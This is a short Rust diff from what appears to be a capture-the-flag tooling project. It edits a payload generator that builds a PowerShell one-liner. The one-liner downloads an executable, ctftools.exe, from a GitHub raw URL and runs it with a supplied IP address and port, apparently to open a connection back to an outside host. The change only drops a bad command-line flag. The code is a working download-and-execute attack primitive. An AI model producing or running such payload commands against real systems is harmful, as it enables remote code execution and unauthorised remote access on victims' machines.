@@ -18,7 +18,7 @@ impl Payload for PayloadDefault {
                 let github_raw_url =
                     "https://github.com/dd060606/CTF-Tools/raw/main/binaries/ctftools.exe";
                 let command = format!(
-                    r#"powershell -Command "Invoke-WebRequest -Uri '{}' -OutFile 'ctftools.exe' -FollowRelocation; Start-Process 'ctftools.exe' -ArgumentList '{}', '{}'""#,
+                    r#"powershell -Command "Invoke-WebRequest -Uri '{}' -OutFile 'ctftools.exe'; Start-Process 'ctftools.exe' -ArgumentList '{}', '{}'""#,
                     github_raw_url, ip, port
                 );
                 Ok(command)
